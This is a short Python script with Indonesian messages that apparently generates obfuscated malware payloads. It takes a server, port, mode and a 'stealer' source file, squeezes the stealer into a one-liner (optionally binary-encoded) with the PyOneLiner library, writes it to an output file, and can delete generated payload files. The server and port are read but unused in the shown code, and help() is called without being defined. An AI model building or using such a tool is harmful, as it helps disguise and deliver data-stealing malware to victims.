import os
import sys
import glob
from io import StringIO

original_stdout = sys.stdout
sys.stdout = StringIO()
from PyOneLiner import OneLiner
sys.stdout = original_stdout

md = "binary"

def Oliner(mode, stealer):
    oneliner = OneLiner(stealer, type_="python")
    if mode == md:
        oneliner.binary()
    return oneliner.done()

def gen(out, txt):
    with open(out, "w") as file:
        file.write(txt)
        
def delpayload():
    files = glob.glob("*payload*")
    for file in files:
        os.remove(file)
    return "\nSemua file payload berhasil dihapus\n"
    
if len(sys.argv) < 7:
    if len(sys.argv) == 2 and (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
        help()
    elif len(sys.argv) == 2 and (sys.argv[1] == "-d" or sys.argv[1] == "--delete"):
        print(delpayload())
    elif len(sys.argv) == 6:
        server = sys.argv[1]
        port = sys.argv[2]
        m = sys.argv[3]
        s = sys.argv[4]
        o = sys.argv[5]
        
        if m in md:
            text = Oliner(m, s)
            if os.path.exists(o):
                os.remove(o)
                print(f"\nFile {o} sudah ada dan berhasil dihapus\nMohon jalankan ulang script ini\n")
            
            gen(o, text)
            
            if os.path.exists(o):
                print(f"File {o} berhasil dibuat dengan mode {m}")